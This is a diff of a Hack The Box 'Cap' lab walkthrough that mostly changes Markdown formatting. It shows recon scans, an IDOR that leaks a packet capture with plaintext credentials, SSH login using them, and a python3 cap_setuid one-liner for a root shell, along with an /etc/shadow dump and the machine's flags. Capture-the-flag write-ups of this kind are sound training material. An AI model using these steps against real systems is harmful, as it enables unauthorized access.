@@ -1,14 +1,13 @@
 ---
-title: Cap - HTB Machine[Easy]
-date: 2025-08-24 17:00:05
-description: Linux - Easy - Retired
+title: Cap
+description: Linux , Easy , Retired
 difficulty: Easy
 difficult_sort: 1
 points: 0
 os: Linux
 target_ip: 10.10.10.245
 platform: Hack The Box
-categories: Machines
+category: Machines
 box_status: Retired
 creators: InfoSecJack
 source_url: https://app.hackthebox.com/machines/Cap
@@ -25,60 +24,54 @@ tags:
   - IDOR
   - privesc/cap_setuid
   - creds-reuse
-authors: [RouxTronics, YamiKami]
-img_path: /assets/img/htb/cap_machine
-image: /assets/img/htb/cap_machine/cap-0.png
 ---
 # Cap - HTB Machine
-
+![200](<./attachments/Cap - HTB Machine.png>)
 - OS: Linux 
 - Difficulty: Easy 
 - Points: 0 pts
-
 ## Summary
-
 - Linux machine running an HTTP server that performs administrative functions including performing network captures. 
 - Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. 
 - The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.
-
-> Attack Path
+> [!tip]  Attack Path
 >- **Foothold** → IDOR in PCAP download → captured plaintext creds
 >- **User** → SSH login with exposed creds
 >- **Root** → Abused Linux capabilities (`cap_setuid`) for escalation
-{: .prompt-tip }
 ## Improved Skills
- 
 - Practicing **Insecure Direct Object Reference(IDOR) exploitation**
 - Leveraging **Linux capabilities** for privilege escalation
-
 ## Tools Used (Categorized)
-
-- **Recon:** Rustscan, nmap
+- **Recon:** [Rustscan](<../../../../../../40-RESOURCES/Tools/Cybersec/Rustscan.md>), [nmap](<../../../../../../40-RESOURCES/Tools/Cybersec/nmap.md>)
 - **Enum/Brute:** ffuf, gobuster ,nuclei
 - **Exploit:** Wireshark, python
 - **Privesc:** linpeas, pspy64
 - **Utils:** wget, nc
 ## References & Further Reading
-
 - [GTFOBins](https://gtfobins.github.io/) — Linux Privesc
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - [HackTricks](https://book.hacktricks.xyz/) — General Pentesting
 - [IppSec HTB Walkthroughs](https://www.youtube.com/c/ippsec) — Video Guides
 - [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
-- [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-
-
-
+- [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+## Tutorial
+```cardlink
+url: https://www.youtube.com/watch?v=O_z6o2xuvlw
+title: "HackTheBox - Cap"
+description: "00:00 - Intro00:50 - Start of nmap and doing some recon against FTP02:40 - Having trouble finding a release date, using WGET and examining metadata to see ho..."
+host: www.youtube.com
+favicon: https://www.youtube.com/s/desktop/271635d3/img/logos/favicon_32x32.png
+image: https://i.ytimg.com/vi/O_z6o2xuvlw/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AHUBoAC4AOKAgwIABABGEkgZSgXMA8=&rs=AOn4CLCQo4OitAMhTgYJbwSvO6Jzi1xz8g
+```
+- [Cap-HTB-Writeup-pdf](<./attachments/Cap.pdf>)
+- [Medium](https://medium.com/@eng.jamaluddin/cap-machine-hack-the-box-25aac74883db)
+---
 # Reconnaissance
-
-> Phase Goal
+> [!abstract] Phase Goal
 > Identify open ports, services, and potential entry points without exploitation. Adapt scans for OS.
-{: .prompt-info }
 
 ## Scanning Workflow
-
 ### Scan All TCP Ports
-
 ```bash
 # Fast TCP sweep (RustScan for speed)
 rustscan -a $TARGET_IP -r 1-65535 -t 10000 --ulimit 6500  -- -oN recon/rustscan.txt -oX recon/rustscan.xml
@@ -87,9 +80,7 @@ rustscan -a $TARGET_IP -r 1-65535 -t 10000 --ulimit 6500  -- -oN recon/rustscan.
 grep "^[0-9]" recon/rustscan.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//' > recon/open_ports.txt
 OPEN_PORTS=$(cat recon/open_ports.txt); echo "OPEN_PORTS=$OPEN_PORTS" | tee -a .env
 ```
-
 ### Enumerated Open Ports
-
 ```bash
 sudo nmap -sC -sV -Pn -vv $TARGET_IP -p $OPEN_PORTS -oA recon/nmap_detailed
 ```
@@ -118,23 +109,20 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 | Port | State | Service                                                                                      | Version                         | Notes                    |
 | ---- | ----- | -------------------------------------------------------------------------------------------- | ------------------------------- | ------------------------ |
-| 21   | open  | ftp | vsftpd 3.0.3                    | Anonymous login disabled |
+| 21   | open  | [ftp](<../../../../../../40-RESOURCES/Networking/Services/FTP (File Transfer Protocol).md>) | vsftpd 3.0.3                    | Anonymous login disabled |
 | 22   | open  | ssh                                                                                          | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 | -                        |
 | 80   | open  | http                                                                                         | Gunicorn                        | -                        |
 
 ---
 # Service Enumeration
-> Phase Goal
+> [!abstract] Phase Goal
 > Probe services for misconfigurations, leaks, and vulnerabilities. Use OS-specific tools.
-{: .prompt-info }
 ## FTP (Port 21) - vsftpd 3.0.3
-
 ### CVE Search
 ```bash
 searchsploit vsftpd 3.0.3
 ```
-
-![400](</assets/img/htb/cap_machine/cap-1.png>)
+![400](<./attachments/Cap-1.png>)
 >A Remote Denial of Service (RDDoS) attack is a malicious attempt to make a server, service, or network unavailable by sending a flood of traffic or specially crafted data from a remote location. - **NOT USEFUL TO GAIN ACCESS**
 
 ```bash
@@ -144,7 +132,7 @@ ftp 10.10.10.245 21
 >Anonymous login disabled
 >Anonymous FTP allows users to access public files on a server without needing a personal user ID or password.
 
-![400](</assets/img/htb/cap_machine/cap-2.png>)
+![400](<./attachments/Cap - HTB Machine-1.png>)
 ## HTTP (Port 80) - gunicorn
 - Port 80 hosts a web server with a dashboard application.
 - **Web Server Details**: gunicorn running on Ubuntu.
@@ -166,33 +154,33 @@ capture                 [Status: 302, Size: 222, Words: 21, Lines: 4, Duration: 
 > Home/Dashboard
 > Access to user: `Nathan`
 
-![400](</assets/img/htb/cap_machine/cap-3.png>)
+![400](<./attachments/Cap - HTB Machine-5.png>)
 #### 404 Error Page
 >http://10.10.10.245/404
 >[Flask](https://flask.palletsprojects.com/en/3.0.x/) is a Python web framework.
 
-![404](</assets/img/htb/cap_machine/cap-4.png>)
+![404](<./attachments/Cap - HTB Machine-6.png>)
 - View [LINK](https://0xdf.gitlab.io/cheatsheets/404#flask) for more info
 #### IP Config section
 > http://10.10.10.245/ip
 
-![400](</assets/img/htb/cap_machine/cap-5.png>)
+![400](<./attachments/Cap - HTB Machine-7.png>)
 #### Network Status Section 
 >http://10.10.10.245/netstat
 
-![400](</assets/img/htb/cap_machine/cap-6.png>)
+![400](<./attachments/Cap - HTB Machine-8.png>)
 #### Security Snapshot Section
 >http://10.10.10.245/data/2
 >click on **Security Snapshot (5 Second PCAP + Analysis)** give a download file option
 - under security snapshots the `data/id` can be change
 - change `data/2` to `data/0`
-![400](</assets/img/htb/cap_machine/cap-7.png>)
+![400](<./attachments/Cap-2.png>)
 >http://10.10.10.245/data/0
 
-![400](</assets/img/htb/cap_machine/cap-8.png>)
+![400](<./attachments/Cap-3.png>)
 - Download the `o.pcap` and analyze with `wireshark/tcpdump`
 ### Key Discoveries
-- Discovered `/data/` directory, which allowed access to files via an **IDOR (Insecure Direct Object Reference)** vulnerability.
+- Discovered `/data/` directory, which allowed access to files via an [IDOR (Insecure Direct Object Reference)](<../../../../../../10-INBOX/IDOR (Insecure Direct Object Reference).md>)vulnerability.
 - URL: `http://10.10.10.245/data/0` displayed a network packet capture (PCAP) file.
 - Iterated through IDs (e.g., `/data/1`, `/data/2`) and found sensitive files, including user credentials in a downloadable file.
 ## Vulnerability Table
@@ -202,12 +190,10 @@ capture                 [Status: 302, Size: 222, Words: 21, Lines: 4, Duration: 
 
 ---
 # Initial Access (Foothold)
-> Phase Goal
+> [!abstract] Phase Goal
 > First stage of a cyberattack where attackers gain entry into a target's network or System.Text.ASCIIEncoding
-{: .prompt-info }
 
-> **Vector:** IDOR → `data/0` file download → `wireshark` view → plain test leaked reuseable password `ssh/ftp`
-{: .prompt-tip } 
+> [!success] **Vector:** IDOR → `data/0` file download → `wireshark` view → plain test leaked reuseable password `ssh/ftp` 
 
 ## File Download Vulnerability
 
@@ -226,12 +212,11 @@ wireshark 0.pcap
 
 > filter via protocol, right-click select `follow/tcp stream> `
 
-![400](</assets/img/htb/cap_machine/cap-9.png>)
-> Important Credentials
+![400](<./attachments/Cap-5.png>)
+>[!IMPORTANT]
 >nathan:Buck3tH4TF0RM3!
 - Reuseable Password 
 - can be used to ftp and ssh into user `nathan`
-{: .prompt-warning }
 ```bash
 ssh nathan@10.10.10.245 -p 22 # Buck3tH4TF0RM3!
 ```
@@ -240,9 +225,8 @@ ssh nathan@10.10.10.245 -p 22 # Buck3tH4TF0RM3!
 #  Privilege Escalation
 > user `nathan` to `root`
 
-> Phase Goal
+> [!abstract] Phase Goal
 > Escalate to highest privileges using OS-specific vectors.
-{: .prompt-info }
 
 >nathan:Buck3tH4TF0RM3!
 ```bash
@@ -280,16 +264,15 @@ pspy64 > loot/pspy.log & # Run for 5-10 min
   - No `sudo` privileges.
   - Checked for unusual capabilities
 
-![00](</assets/img/htb/cap_machine/cap-10.png>)
+![00](<./attachments/Cap-6.png>)
 ## Privilege Escalation Vector
-> **Vector:**  `/usr/bin/python3` had the `cap_setuid+ep` capability, allowing it to set the user ID to any user (including root).
-{: .prompt-tip }
+> [!success] **Vector:**  `/usr/bin/python3` had the `cap_setuid+ep` capability, allowing it to set the user ID to any user (including root).
 
 ```bash
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 - This spawned a root shell, granting full administrative access.
-![00](</assets/img/htb/cap_machine/cap-11.png>)
+![00](<./attachments/Cap - HTB Machine-9.png>)
 ---
 # Trophies
 
@@ -297,12 +280,12 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```txt
 f63e490a8a3fd6f7032ac8e7f0b89e1c
 ```
-![400](</assets/img/htb/cap_machine/cap-12.png>)
+![400](<./attachments/Cap - HTB Machine-2.png>)
 ### Root Flag
 ```txt
 3540f38a944802969e78336b1745a481
 ```
-![400](</assets/img/htb/cap_machine/cap-13.png>)
+![400](<./attachments/Cap - HTB Machine-3.png>)
 ### Additional (e.g., /etc/shadow )
 ```bash
 cat /etc/shadow | grep -F "\$"
@@ -311,7 +294,7 @@ cat /etc/shadow | grep -F "\$"
 root:$6$8vQCitG5q4/cAsI0$Ey/2luHcqUjzLfwBWtArUls9.IlVMjqudyWNOUFUGDgbs9T0RqxH6PYGu/ya6yG0MNfeklSnBLlOskd98Mqdm0:18762:0:99999:7:::
 nathan:$6$R9uks4CNctqqxTOR$/PRd4MKFG5NUNxPkdvIedn.WGvkBh9zqcvCRRzgggky1Xcv7ZxTXfny0QmA.gZ/8keiXdblFB7muSeo2igvjk.:18762:0:99999:7:::
 ```
-![400](</assets/img/htb/cap_machine/cap-14.png>)
+![400](<./attachments/Cap - HTB Machine-4.png>)
 
 ---
 # Guided Mode - Q&A
@@ -362,4 +345,4 @@ f63e490a8a3fd6f7032ac8e7f0b89e1c
 ```
 ---
 # Proof of Box Pwned
-![](</assets/img/htb/cap_machine/cap-15.png>)
+![](<./attachments/Cap-7.png>)
